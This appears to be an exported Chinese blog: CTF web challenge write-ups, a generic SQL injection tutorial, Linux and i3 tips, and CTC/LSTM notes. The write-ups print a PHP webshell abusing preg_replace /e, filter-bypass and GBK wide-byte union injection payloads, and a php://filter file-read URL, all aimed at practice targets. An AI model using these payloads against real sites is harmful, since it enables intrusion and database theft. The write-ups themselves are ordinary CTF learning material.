\u0026#39;antiinject.php\u0026#39;; include \u0026#39;antixss.php\u0026#39;; $id=antiinject($id); $con = mysql_connect($db_address,$db_user,$db_pass) or die(\u0026#34;不能连接到数据库！！\u0026#34;.mysql_error()); mysql_select_db($db_name,$con); $id=mysql_real_escape_string($id); $result=mysql_query(\u0026#34;SELECT * FROM `message` WHERE display=1 AND id=$id\u0026#34;); $rs=mysql_fetch_array($result); echo htmlspecialchars($rs[\u0026#39;nice\u0026#39;]).\u0026#39;:\u0026lt;br /\u0026gt;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026#39;.antixss($rs[\u0026#39;say\u0026#39;]).\u0026#39;\u0026lt;br /\u0026gt;\u0026#39;; mysql_free_result($result); mysql_free_result($file); mysql_close($con); ?\u0026gt; passencode.php\n\u0026lt;?php function passencode($content){ //$pass=urlencode($content); $array=str_split($content); $pass=\u0026#34;\u0026#34;; for($i=0;$i\u0026lt;count($array);$i++){ if($pass!=\u0026#34;\u0026#34;){ $pass=$pass.\u0026#34; \u0026#34;.(string)ord($array[$i]); }else{ $pass=(string)ord($array[$i]); } } return $pass; } ?\u0026gt; say.php\n\u0026lt;?php include \u0026#39;config.php\u0026#39;; $nice=$_POST[\u0026#39;nice\u0026#39;]; $say=$_POST[\u0026#39;usersay\u0026#39;]; if(!isset($_COOKIE[\u0026#39;username\u0026#39;])){ setcookie(\u0026#39;username\u0026#39;,$nice); setcookie(\u0026#39;userpass\u0026#39;,\u0026#39;\u0026#39;); } $username=$_COOKIE[\u0026#39;username\u0026#39;]; $userpass=$_COOKIE[\u0026#39;userpass\u0026#39;]; if($nice==\u0026#34;\u0026#34; || $say==\u0026#34;\u0026#34;){ echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;昵称或留言内容不能为空！(如果有内容也弹出此框，不是网站问题喔~ 好吧，给个提示：查看页面源码有惊喜！)\u0026#39;);\u0026lt;/script\u0026gt;\u0026#34;; exit(); } $con = mysql_connect($db_address,$db_user,$db_pass) or die(\u0026#34;不能连接到数据库！！\u0026#34;.mysql_error()); mysql_select_db($db_name,$con); $nice=mysql_real_escape_string($nice); $username=mysql_real_escape_string($username); $userpass=mysql_real_escape_string($userpass); $result=mysql_query(\u0026#34;SELECT username FROM admin where username=\u0026#39;$nice\u0026#39;\u0026#34;,$con); $login=mysql_query(\u0026#34;SELECT * FROM admin where username=\u0026#39;$username\u0026#39; AND userpass=\u0026#39;$userpass\u0026#39;\u0026#34;,$con); if(mysql_num_rows($result)\u0026gt;0 \u0026amp;\u0026amp; mysql_num_rows($login)\u0026lt;=0){ echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;昵称已被使用，请更换！\u0026#39;);\u0026lt;/script\u0026gt;\u0026#34;; mysql_free_result($login); mysql_free_result($result); mysql_close($con); exit(); } mysql_free_result($login); mysql_free_result($result); $say=mysql_real_escape_string($say); mysql_query(\u0026#34;insert into message (nice,say,display) values(\u0026#39;$nice\u0026#39;,\u0026#39;$say\u0026#39;,0)\u0026#34;,$con); mysql_close($con); echo \u0026#39;\u0026lt;script\u0026gt;alert(\u0026#34;构建和谐社会，留言需要经过管理员审核才可以显示！\u0026#34;);window.location = \u0026#34;./index.php\u0026#34;\u0026lt;/script\u0026gt;\u0026#39;; ?\u0026gt; preview.php\n\u0026lt;?php $prenice=$_POST[\u0026#39;nice\u0026#39;]; $presay=$_POST[\u0026#39;usersay\u0026#39;]; include \u0026#39;antixss.php\u0026#39;; echo \u0026#39;\u0026#34;\u0026#39;.antixss($presay).\u0026#39;\u0026#34;\u0026#39;; echo htmlspecialchars($prenice); echo antixss($presay); ?\u0026gt; 发现了一些新的页面 ./antiinject.php ./antixss.php ./loginxlcteam/\nantiinject.php \u0026lt;?php function antiinject($content){ $keyword=array(\u0026#34;select\u0026#34;,\u0026#34;union\u0026#34;,\u0026#34;and\u0026#34;,\u0026#34;from\u0026#34;,\u0026#39; \u0026#39;,\u0026#34;\u0026#39;\u0026#34;,\u0026#34;;\u0026#34;,\u0026#39;\u0026#34;\u0026#39;,\u0026#34;char\u0026#34;,\u0026#34;or\u0026#34;,\u0026#34;count\u0026#34;,\u0026#34;master\u0026#34;,\u0026#34;name\u0026#34;,\u0026#34;pass\u0026#34;,\u0026#34;admin\u0026#34;,\u0026#34;+\u0026#34;,\u0026#34;-\u0026#34;,\u0026#34;order\u0026#34;,\u0026#34;=\u0026#34;); $info=strtolower($content); for($i=0;$i\u0026lt;=count($keyword);$i++){ $info=str_replace($keyword[$i], \u0026#39;\u0026#39;,$info); } return $info; } ?\u0026gt; antixss.php \u0026lt;?php function antixss($content){ preg_match(\u0026#34;/(.*)\\[a\\](.*)\\[\\/a\\](.*)/\u0026#34;,$content,$url); $key=array(\u0026#34;(\u0026#34;,\u0026#34;)\u0026#34;,\u0026#34;\u0026amp;\u0026#34;,\u0026#34;\\\\\u0026#34;,\u0026#34;\u0026lt;\u0026#34;,\u0026#34;\u0026gt;\u0026#34;,\u0026#34;\u0026#39;\u0026#34;,\u0026#34;%28\u0026#34;,\u0026#34;%29\u0026#34;,\u0026#34; on\u0026#34;,\u0026#34;data\u0026#34;,\u0026#34;src\u0026#34;,\u0026#34;eval\u0026#34;,\u0026#34;unescape\u0026#34;,\u0026#34;innerHTML\u0026#34;,\u0026#34;document\u0026#34;,\u0026#34;appendChild\u0026#34;,\u0026#34;createElement\u0026#34;,\u0026#34;write\u0026#34;,\u0026#34;String\u0026#34;,\u0026#34;setTimeout\u0026#34;,\u0026#34;cookie\u0026#34;); //因为太菜，很懒，所以。。。(过滤规则来自Mramydnei) $re=$url[2]; if(count($url)==0){ return htmlspecialchars($content); }else{ for($i=0;$i\u0026lt;=count($key);$i++){ $re=str_replace($key[$i], \u0026#39;_\u0026#39;,$re); } return htmlspecialchars($url[1],ENT_QUOTES).\u0026#39;\u0026lt;a href=\u0026#34;\u0026#39;.$re.\u0026#39;\u0026#34;\u0026gt;\u0026#39;.$re.\u0026#39;\u0026lt;/a\u0026gt;\u0026#39;.htmlspecialchars($url[3],ENT_QUOTES); } } ?\u0026gt; 尝试对 so.php 进行 sql 注入 # 将 User-Angent 改为 Xlcteam Browser，提交参数 soid 开始注入。\n查询语句为 SELECT * FROM message WHERE display=1 AND id=$id\nid 没有包裹引号，过滤规则双写即可绕过，因为是按顺序进行替换敏感词，因此在语句中插入 ‘=’ 也可\n构造 soid=1/**/aandnd/**/0/**/uniunionon/**/seselectlect/**/1,2,3,4 回显为 2，3。 根据 admin 表结构一通注入 ，得到\nadmin 102 117 99 107 114 117 110 116 117\n密码转换出来后即可进入后台,提示有一个小马，使用 about.php 获取小马内容\n\u0026lt;?php $e = $_REQUEST[\u0026#39;www\u0026#39;]; $arr = array($_POST[\u0026#39;wtf\u0026#39;] =\u0026gt; \u0026#39;|.*|e\u0026#39;,); array_walk($arr, $e, \u0026#39;\u0026#39;); ?\u0026gt; //因为太菜，很懒，所以。。。(过滤规则来自Mramydnei) $re=$url[2]; if(count($url)==0){ return htmlspecialchars($content); }else{ for($i=0;$i\u0026lt;=count($key);$i++){ $re=str_replace($key[$i], '_',$re); } return htmlspecialchars($url[1],ENT_QUOTES).'\u0026lt;a href=\u0026quot;'.$re.'\u0026quot;\u0026gt;'.$re.'\u0026lt;/a\u0026gt;'.htmlspecialchars($url[3],ENT_QUOTES); } } //因为太菜，很懒，所以。。。(过滤规则来自Mramydnei) $re=$url[2]; if(count($url)==0){ return htmlspecialchars($content); }else{ for($i=0;$i\u0026lt;=count($key);$i++){ $re=str_replace($key[$i], '_',$re); } return htmlspecialchars($url[1],ENT_QUOTES).'\u0026lt;a href=\u0026quot;'.$re.'\u0026quot;\u0026gt;'.$re.'\u0026lt;/a\u0026gt;'.htmlspecialchars($url[3],ENT_QUOTES); } } 数组的 value 中是|.*|e，这里用到了正则匹配的 preg_replace()的一个漏洞：\n参考 https://www.jb51.net/article/38714.htm\n简单来说就是正则中/e(这里和|e 效果一样) 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。 所以我们可以传递 preg_replace 给 www，这样 array 中的值就是第一个参数，键就是第二个参数，正好可以利用 preg_replace 的漏洞，然后会执行$_POST[‘wtf’]，就相当于一个一句话马了。\nurl 里加入参数 www=preg_replace ,post 参数 wtf=print_r(scandir(.)) 列出目录，flag 所在文件名为 \u0026lsquo;恭喜你获得 flag2.txt\u0026rsquo; , 利用 about.php 读取即可。\n","date":"2020-02-07","externalUrl":null,"permalink":"/posts/cg-ctf-web-2/","section":"Posts","summary":"","title":"CG CTF Web #2","type":"posts"},{"content":"","date":"2020-02-07","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"CTF","type":"tags"},{"content":"","date":"2020-02-07","externalUrl":null,"permalink":"/categories/penetration/","section":"Categories","summary":"","title":"Penetration","type":"categories"},{"content":"","date":"2020-02-07","externalUrl":null,"permalink":"/tags/web/","section":"Tags","summary":"","title":"Web","type":"tags"},{"content":" 0x00 签到题 # 浏览器中按 F12 查看网页元素即可获得 Flag。\n0x01 md5 collision # 给出了源码\n$md51 = md5(\u0026#39;QNKCDZO\u0026#39;); $a = @$_GET[\u0026#39;a\u0026#39;]; $md52 = @md5($a); if(isset($a)){ if ($a != \u0026#39;QNKCDZO\u0026#39; \u0026amp;\u0026amp; $md51 == $md52) { echo \u0026#34;nctf{*****************}\u0026#34;; } else { echo \u0026#34;false!!!\u0026#34;; }} else{echo \u0026#34;please input a\u0026#34;;} 可以看到后台先获取了参数 a,然后分别对 QNKCDZO 和 a 进行了 MD5 加密， 然后对比两者的 MD5 值，但是 a 不能和他给出的字符串相等。先尝试对题目给出的字符串进行 MD5 加密，32 位结果为 0e830400451993494058024219903391，发现是一个科学计数法的表示方式， 0 的任意次方等于 0 ， 因此只要找到其他 MD5 值为 0eXXXXXXXXX 格式的字符串即可。 通过查找资料发现以下字符串\n字符串 MD5 QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 将参数附在 URL 后面， 构造 http://chinalover.sinaapp.com/web19/?a=s878926199a , 成功获得 Flag。\n0x02 签到 2 # 需要输入下面的 zhimakaimen ，发现输入 10 个字符后就无法输入了，查看网页元素，修改 maxlength 属性值即可。\n0x03 这题不是 WEB # 一进入网页就看到一张动图，下载下来修改格式为 txt ，用文本工具打开后在末尾找到了 Flag。\n0x04 层层递进 # 在网页元素中找到本网址下的文件 SO.html ,打开后找到 S0.html ,打开后找到 404.html 。在最后一个网页的注释中找到 Flag， 这个题目的名字就是提示。\n0x05 AAencode # jjencode 将 JS 代码转换成只有符号的字符串\naaencode 将 JS 代码转换成常用的网络表情\n浏览器解析出来的字符会出现编码问题，将网页保存为 txt 然后放到浏览器的控制台中运行，即可获得 Flag 。\n0x06 单身二十年 # 看到题目描述的手速就想到跳转或者刷新页面之类的功能，果然页面从 ./search_key.php 跳转到了 ./no_key_is_here_forever.php 。在本地终端输入 curl http://chinalover.sinaapp.com/web8/search_key.php 即可获取该网页的内容。 \u0026lt;script\u0026gt;window.location=\u0026quot;./no_key_is_here_forever.php\u0026quot;; \u0026lt;/script\u0026gt;\n0x07 php decode # 题目给出了一段代码\n\u0026lt;?php function CLsI($ZzvSWE) { $ZzvSWE = gzinflate(base64_decode($ZzvSWE)); for ($i = 0; $i \u0026lt; strlen($ZzvSWE); $i++) { $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1); } return $ZzvSWE; } eval(CLsI(\u0026#34;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==\u0026#34;)); ?\u0026gt; 直接运行报错，将 eval 改为 echo 之后输出结果\n0x08 文件包含 # 使用 php://filter 构建 URL\nhttp://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php\n读取源文件内容。对其进行 base64 解密后可以在注释中找到 Flag。\n参考：\nhttps://blog.csdn.net/zz_Caleb/article/details/84193092 https://www.freebuf.com/articles/web/182280.html 0x09 单身一百年也没用 # 和前面的题目一样，先尝试 curl 获取网页内容，返回为空。使用 curl -I 查看报文头部信息，找到 Flag，Flag 告诉我们，这是 302 重定向。\n0x0A Download~! # 访问不了啊啊啊\n0x0B COOKIE # 使用 BurpSuite 抓包，将请求报文中 Cookie: Login=0 改为 1 即可。\n0x0C MYSQL # 进入网站体提醒我们查看 robots.txt ，内容为\n别太开心，flag不在这，这个文件的用途你看完了？ 在CTF比赛中，这个文件往往存放着提示信息 TIP:sql.php \u0026lt;?php if($_GET[id]) { mysql_connect(SAE_MYSQL_HOST_M . \u0026#39;:\u0026#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(\u0026#34;select content from ctf2 where id=\u0026#39;$id\u0026#39;\u0026#34;)); if ($_GET[id]==1024) { echo \u0026#34;\u0026lt;p\u0026gt;no! try again\u0026lt;/p\u0026gt;\u0026#34;; } else{ echo($query[content]); } } ?\u0026gt; 根据代码内容可知文件名 sql.php ， id 不能等于 1024，说明 id 等于 1024 的记录即答案， 发现前面有 intval 函数，输入 id = 1024.1 即可获得 Flag。\n0x0D GBK Injection # 参考： http://www.2cto.com/article/201209/153283.html\n提示： your sql:select id,title from news where id = 1'\n输入引号发现被转义为 ' 的格式，构造 %fe%27 后变为 %fe%5c %27 的格式，即可闭合前面的参数。\n构造 index.php?id=1%fe%27and%201=1%23\n正常返回。\n构造 index.php?id=1%fe%27order%20by%202%23\n确定字段数为 2，这里其实可以通过页面上的 select 语句直接确定。\n构造 index.php?id=1%fe%27and%201=2%20%20union%20select%201,2%23\n返回的是第二个字段即 title 字段。\n构造 index.php?id=1%fe%27and%201=2%20%20union%20select%201,database()%23\n爆数据库名，为 sae-chinalover\n构造 index.php?id=1%fe%27and%201=2%20%20union%20select%201,version()%23\n获取数据库版本 5.5.52-0ubuntu0.14.04.1\n构造 index.php?id=1%fe%27and%201=2%20%20union%20select%201,ord(mid(user(),1,1))%23\n用户名为 sae-chinalover@123.125.23.211\n构造 index.php?id=1%fe%27and%201=2%20%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=0x7361652d6368696e616c6f766572%23\n得到表名 ctf,ctf2,ctf3,ctf4,gbksqli,news\n构造 index.php?id=1%fe%27and%201=2%20%20union%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x637466%23\n列名 字段 1 字段 2 字段 3 ctf user pw ctf2 id content ctf3 id email token ctf4 gkbsqli flag 找了半天。。终于找到 flag 了\n构造 index.php?id=1%fe%27and%201=2%20%20union%20select%201,flag%20from%20gbksqli%23\n获得 Flag\n其实这里用 sqlmap 会快很多，不必自己一个一个去试。但是最后 flag 提交失败，可能又出了问题。\n0x0E /x00 # 题目先给出了源代码如下\nif (isset ($_GET[\u0026#39;nctf\u0026#39;])) { if (@ereg (\u0026#34;^[1-9]+$\u0026#34;, $_GET[\u0026#39;nctf\u0026#39;]) === FALSE) echo \u0026#39;必须输入数字才行\u0026#39;; else if (strpos ($_GET[\u0026#39;nctf\u0026#39;], \u0026#39;#biubiubiu\u0026#39;) !== FALSE) die(\u0026#39;Flag: \u0026#39;.$flag); else echo \u0026#39;骚年，继续努力吧啊~\u0026#39;; } 查找字符串 \u0026lsquo;#biubiubiu\u0026rsquo; 在参数中第一次出现的位置，且必须出现，但是参数又必须是数字。根据题目的提示进行字符串截断。\n构造 index.php?nctf=1%00%23biubiubiu 即可。\n因为题目说解法不止一种，接下来给出通过报错达到 满足 @ereg (\u0026quot;^[1-9]+$\u0026quot;, $_GET['nctf']) === FALSE 和 strpos ($_GET['nctf'], '#biubiubiu') !== FALSE 的目的。\nnctf[]=#biubiubiu 可以通过传递数组的方式使程序报错。\n0x0F bypass again # 给出了以下代码\nif (isset($_GET[\u0026#39;a\u0026#39;]) and isset($_GET[\u0026#39;b\u0026#39;])) { if ($_GET[\u0026#39;a\u0026#39;] != $_GET[\u0026#39;b\u0026#39;]) if (md5($_GET[\u0026#39;a\u0026#39;]) == md5($_GET[\u0026#39;b\u0026#39;])) die(\u0026#39;Flag: \u0026#39;.$flag); else print \u0026#39;Wrong.\u0026#39;; } 参数 a 和参数 b 不能相等，但 MD5 值要相等，和之前的题目一样,不细写了。\n未完待续。。\n","date":"2020-02-07","externalUrl":null,"permalink":"/posts/cg-ctf-web-1/","section":"Posts","summary":"","title":"CG CTF Web #1","type":"posts"},{"content":" 0x00 确定删除文件所在分区 # df \u0026lt;被删除文件所在文件夹\u0026gt; 0x01 进入 debugfs 工具 # debugfs (如果是不是 root 用户需要在命令前加 sudo)\n0x02 在 debugfs 工具中打开文件分区并列出删除文件 # debugfs: open \u0026lt;0x00 中返回的分区如 /dev/sda1\u0026gt; debugfs: ls -d \u0026lt;被删除文件所在目录\u0026gt; 返回类似 “\u0026lt;12345678\u0026gt; (20) filename”\n0x03 找到被删除文件所在的位置 # debugfs: logdump –i \u0026lt;12345678\u0026gt;\n返回内容类似\nInode 12345678 is at group 1040, block 34078863, offset 1664 Journal starts at block 65638, transaction 1209216 Found sequence 1200142 (not 1209605) at block 72380: end of journal. 记住 block 和 offset 的值\n0x04 恢复文件 # $ sudo dd if=\u0026lt;文件所在分区\u0026gt; of=\u0026lt;文件所在文件夹\u0026gt; bs=\u0026lt;offset 的值\u0026gt; count=1 skip=\u0026lt;block 的值\u0026gt;\n后续 # 这种方法的优点是不需要安装额外的软件，虽然比较繁琐但只需要恢复少量文件的话还是可以接受的。用这种方法不能否还原目录，下次有需要再尝试。\n参考自本博文\n","date":"2020-01-22","externalUrl":null,"permalink":"/posts/recover-removed-files-on-linux/","section":"Posts","summary":"","title":"Recover Removed Files on Linux","type":"posts"},{"content":"因为我使用ArchLinux，使用Pacman更新时常常遇到需要在命令前加sudo的情况，每次都需要把光标移到命令首部加 sudo ，经查找可以使用 sudo !! 获取前一条命令并加上 sudo 。\n如运行 pacman -Syu 报错，使用 sudo !! 生成 sudo pacman -Syu 回车即可。\n或者使用 thefuck ，不仅可以补全 sudo ，也可以更正输入错误的命令。\n","date":"2020-01-21","externalUrl":null,"permalink":"/posts/add-sudo-quickly/","section":"Posts","summary":"","title":"Add Sudo Quickly","type":"posts"},{"content":"","date":"2020-01-21","externalUrl":null,"permalink":"/tags/tips/","section":"Tags","summary":"","title":"Tips","type":"tags"},{"content":"","date":"2020-01-21","externalUrl":null,"permalink":"/tags/tools/","section":"Tags","summary":"","title":"Tools","type":"tags"},{"content":"为了在 Linux 上方便快捷地查询生词，使用了一个 Python 脚本爬取有道词典上的释义，代码更改自此文章\n可以在命令行中通过以下命令查询单词 fy \u0026lt;word\u0026gt;\n","date":"2020-01-21","externalUrl":null,"permalink":"/posts/translate-words-in-commandline/","section":"Posts","summary":"","title":"Translate Words in Commandline","type":"posts"},{"content":"","date":"2020-01-13","externalUrl":null,"permalink":"/tags/i3wm/","section":"Tags","summary":"","title":"I3WM","type":"tags"},{"content":" i3 is a tiling window manager, completely written from scratch. The target platforms are GNU/Linux and BSD operating systems, our code is Free and Open Source Software (FOSS) under the BSD license. i3 is primarily targeted at advanced users and developers.\n0x00 i3 的安装与启动 # 安装 i3-gaps , i3-gaps 比 i3 有更多特性， 更加美观。\nsudo pacman -S i3-gaps\n因为我之前使用的桌面是 GNOME，所以可以直接使用 GDM(the GNOME Display Manger) 进行启动， 输入密码之后，在 Sign in 按钮旁边的小齿轮菜单中选择 i3 再登陆即可。\ni3 的配置文件在 ~/.config/i3/config ,可以根据自己的喜好配置快捷键和自启动程序。\n0x01 其他工具 # 终端 sakura 状态栏 Polybar 窗口管理器 Compton 程序启动器 rofi 输入法 ibus-libpinyin (因为未知原因无法识别到 fcitx 输入法) 桌面 feh 命令行网易云音乐 musicbox 蓝牙管理软件 blueman 网络管理软件 nm-applet 浏览器 chromium 文件管理器 ranger 锁屏软件 i3lock-fancy-gitAUR 以上软件大部分都可以直接使用 pacman 包管理工具进行安装。部分软件需要设置自动运行，在 i3 的配置文件中进行修改即可。Polybar 参考此配置，具体使用可以查看 Wiki 。\n","date":"2020-01-13","externalUrl":null,"permalink":"/posts/use-i3-on-arch-linux/","section":"Posts","summary":"","title":"Use I3 on Arch Linux","type":"posts"},{"content":" 以 mysql 为例， 不同数据库的特殊情况另行整理\n0x00 判断注入点 # 1 and 1=1 返回正常， 1 and 1=2 返回错误说明存在注入点 (以上为数字型，字符串型应加引号，如 1'and’1'=‘1)\n0x01 判断字段数（列数） # 使用 order by \u0026lt;num\u0026gt; , 根据返回判断列数，当 \u0026lt;num\u0026gt; 大于最大列数时，将返回错误\n0x02 匹配字段位置 # 根据字段数构造联合查询语句 id=1 and 1=2 union select 1,2,...n ， n 即为字段数，根据不同数字在页面中出现的位置，选择合适的字段作为 payload 对数据库中的信息进行查询\n0x03 内置函数和系统数据库 # version() 版本信息 database() 当前数据库 user() 当前用户\nand ord(mid(user(),1,1))=114 //即 user() 以字母 ’r‘ 开头 @@global.version_compile_os from mysql.user\n0x04 使用 mysql 的数据库的系统库获取信息 # （mysql 5 以上）information_schema\nselect SCHEME_NAME from information_schema.SCHEMATA limit 0,1 //查看库名\nselect TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=\u0026lt;database\u0026gt; limit 0,1 //查看表名， 可能需要转为 0xHHHHHHH 的十六进制格式。\nselect COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=\u0026lt;table\u0026gt; limit 0,1//查看列名\nselect \u0026lt;column_1\u0026gt;,\u0026lt;column_2\u0026gt;,concat(\u0026lt;column_3\u0026gt;,\u0026lt;column_4\u0026gt;) from \u0026lt;table\u0026gt; limit 0,1 //查看表内信息\n（concat 函数中可以考虑用如 0x3c 之类的标识符进行分割）\n后续 # 一般数据库中密码都会进行 md5 加密， 因此要获取明文需要对其进行解密\n","date":"2019-12-25","externalUrl":null,"permalink":"/posts/easy-sql-injection/","section":"Posts","summary":"","title":"EASY SQL_Injection","type":"posts"},{"content":"","date":"2019-12-25","externalUrl":null,"permalink":"/tags/injection/","section":"Tags","summary":"","title":"Injection","type":"tags"},{"content":"","date":"2019-12-25","externalUrl":null,"permalink":"/tags/sql/","section":"Tags","summary":"","title":"SQL","type":"tags"},{"content":"","date":"2019-12-25","externalUrl":null,"permalink":"/tags/ctc/","section":"Tags","summary":"","title":"CTC","type":"tags"},{"content":"在语音识别中，我们的数据集是音频文件和其对应的文本，不幸的是，音频文件和文本很难再单词的单位上对齐。除了语言识别，在 OCR，机器翻译中，都存在类似的 Sequence to Sequence 结构，同样也需要在预处理操作时进行对齐，但是这种对齐有时候是非常困难的。如果不使用对齐而直接训练模型时，由于人的语速的不同，或者字符间距离的不同，导致模型很难收敛。\nCTC(Connectionist Temporal Classification)是一种避开输入与输出的一种方式，是非常适合语音识别或者 OCR 这种应用的。\n算法详解（以语音识别为例） # 给定输入 X ，CTC 输出每个可能输出及其条件概率。问题的关键是 CTC 的输出概率是如何考虑 X 和 Y 之间的对齐的，这种对齐也是构建损失函数的基础。所以，首先我们分析 CTC 的对齐方式，然后我们在分析 CTC 的损失函数的构造。\n对齐 # 需要注意的是，CTC 本身是不需要对齐的，但是我们需要知道 X 的输出路径和最终输出结果的对应关系，因为在 CTC 中，多个输出路径可能对应一个输出结果，举例来理解。例如在 OCR 的任务中，输入 X 是含有“CAT”的图片，输出 Y 是文本[C, A, T]。将 X 分割成若干个时间片，每个时间片得到一个输出，一个最简答的解决方案是合并连续重复出现的字母，如图：\n这个问题有两个缺点：\n几乎不可能将 X 的每个时间片都和输出 Y 对应上，例如 OCR 中字符的间隔，语音识别中的停顿; 不能处理有连续重复字符出现的情况，例如单词“HELLO”，按照上面的算法，输出的是“HELO”而非“HELLO”。 为了解决上面的问题，CTC 引入了空白字符 \\epsilon ，例如 OCR 中的字符间距，语音识别中的停顿均表示为 \\epsilon 。所以，CTC 的对齐涉及去除重复字母和去除 \\epsilon 两部分\n这种对齐方式有三个特征：\nX 与 Y 之间的时间片映射是单调的，即如果 X 向前移动一个时间片， Y 保持不动或者也向前移动一个时间片； X 与 Y 之间的映射是多对一的，即多个输出可能对应一个映射，反之则不成立，所以也有了特征 3； X 的长度大于等于 Y 的长度。 损失函数 # CTC 的时间片的输出和输出序列的映射如图\n也就是说，对应标签 Y ，其关于输入 X 的后验概率可以表示为所有映射为 Y 的路径之和，我们的目标就是最大化 Y 关于 x = y 的后验概率 P(Y|X) 。假设每个时间片的输出是相互独立的，则路径的后验概率是每个时间片概率的累积，公式及其详细含义如图\n上面的 CTC 算法存在性能问题，对于一个时间片长度为 T 的 N 分类任务，所有可能的路径数为 T^N ，在很多情况下，这几乎是一个宇宙级别的数字，用于计算 Loss 几乎是不现实的。在 CTC 中采用了动态规划的思想来对查找路径进行剪枝，算法的核心思想是如果路径 \\pi_1 和路径 \\pi_2 在时间片 t 之前的输出均相等，我们就可以提前合并他们，如图\n其中，横轴的单位是 X 的时间片，纵轴的单位是 Y 插入 \\epsilon 的序列 Z 。例如对于单词“ZOO”，插入 \\epsilon 后为：\n","date":"2019-12-25","externalUrl":null,"permalink":"/posts/ctc-loss-basic-introduction/","section":"Posts","summary":"","title":"CTC Loss: A Basic Introduction","type":"posts"},{"content":"","date":"2019-12-25","externalUrl":null,"permalink":"/categories/machine-learning/","section":"Categories","summary":"","title":"Machine Learning","type":"categories"},{"content":"","date":"2019-12-25","externalUrl":null,"permalink":"/tags/ml/","section":"Tags","summary":"","title":"ML","type":"tags"},{"content":"","date":"2019-12-25","externalUrl":null,"permalink":"/tags/lstm/","section":"Tags","summary":"","title":"LSTM","type":"tags"},{"content":"由于梯度消失/梯度爆炸的问题传统 rnn 在实际中很难处理长期依赖，而 LSTM（long short term memory）则绕开了这些问题依然可以从语料中学习到长期依赖关系。\n传统 rnn 每一步的隐藏单元只是执行一个简单的 tanh 或 relu 操作,如图：\nlstm 每个循环的模块内又有 4 层结构:3 个 sigmoid 层，1 个 tanh 层，如图：\nlstm 内部结构详解 # lstm 的关键是细胞状态 c，一条水平线贯穿于图形的上方，这条线上只有些少量的线性操作，信息在上面流传很容易保持。\n第一层是个忘记层，决定细胞状态中丢弃什么信息。把 ht−1 和 xt 拼接起来，传给一个 sigmoid 函数，该函数输出 0 到 1 之间的值，这个值乘到细胞状态 ct−1 上去。sigmoid 函数的输出值直接决定了状态信息保留多少。比如当我们要预测下一个词是什么时，细胞状态可能包含当前主语的性别，因此正确的代词可以被选择出来。当我们看到新的主语，我们希望忘记旧的主语。\n上一步的细胞状态 ct−1 已经被忘记了一部分，接下来本步应该把哪些信息新加到细胞状态中呢？这里又包含 2 层：一个 tanh 层用来产生更新值的候选项 c~t，tanh 的输出在[-1,1]上，说明细胞状态在某些维度上需要加强，在某些维度上需要减弱；还有一个 sigmoid 层（输入门层），它的输出值要乘到 tanh 层的输出上，起到一个缩放的作用，极端情况下 sigmoid 输出 0 说明相应维度上的细胞状态不需要更新。在那个预测下一个词的例子中，我们希望增加新的主语的性别到细胞状态中，来替代旧的需要忘记的主语。\n现在可以让旧的细胞状态 ct−1 与 ft（f 是 forget 忘记门的意思）相乘来丢弃一部分信息，然后再加个需要更新的部分 it∗c~t（i 是 input 输入门的意思），这就生成了新的细胞状态 ctct。\n最后该决定输出什么了。输出值跟细胞状态有关，把 ct 输给一个 tanh 函数得到输出值的候选项。候选项中的哪些部分最终会被输出由一个 sigmoid 层来决定。在那个预测下一个词的例子中，如果细胞状态告诉我们当前代词是第三人称，那我们就可以预测下一词可能是一个第三人称的动词。\nlstm 详解 # 单层ｌｓｔｍ结构如下\ncell = tf.contrib.rnn.lstmblockcell(hidden_size, forget_bias=0.0) outputs = [] state = self._initial_state # state with tf.variable_scope(\u0026#34;rnn\u0026#34;): for time_step in range(num_steps): if time_step \u0026gt; 0: tf.get_variable_scope().reuse_variables() # cell_output: [batch_size,hidden_size] (cell_output, state) = cell(inputs[:,time_step,:], state) # outputs: a list: num_steps elements of shape [batch_size,hidden_size] outputs.append(cell_output) # output: first to shape:[batch_size,num_steps*hidden_size] and the first row is the data of the first sentense # and then reshpae to shape: [batch_size*num_steps,hidden_size], first num_steps rows is a sentense output = tf.reshape(tf.concat(outputs,1), [-1, hidden_size]) # 7.softmax: convert wordvec to probability for each word in vocab and calculate cross_entropy loss # used to find which word in vocab the wordvec is like softmax_w = tf.get_variable(\u0026#34;softmax_w\u0026#34;, [hidden_size, vocab_size], dtype=data_type()) softmax_b = tf.get_variable(\u0026#34;softmax_b\u0026#34;, [vocab_size], dtype=data_type()) 用 lstmblockcell 构造了一个 lstm 单元，单元里的隐藏单元个数是 hidden_size，有四个神经网络，每个神经网络的输入是$h_t−1$和$x_t$，将它们 concat 到一起，维度为(hidden_size+wordvec_size)，所以 lstm 里的每个黄框的参数矩阵的维度为 [hidden_size+wordvec_size,hidden_size]\n需要注意的是，num_steps 个时刻的 lstm 都是共享一套参数的，说是有 num_steps 个 lstm 单元，其实只有一个，只不过是对这个单元执行 num_steps 次。\n上面的代码中有个 for 循环，是以时间进行展开，在循环里执行当前时刻下的单词。\n举个例子，比如一批训练 64 句话，每句话 20 个单词，每个词向量长度为 200，隐藏层单元个数为 128\n那么训练一批句子，输入的张量维度是[64,20,200]，$h_t$,$c_t$ 的维度是[128]，那么 lstm 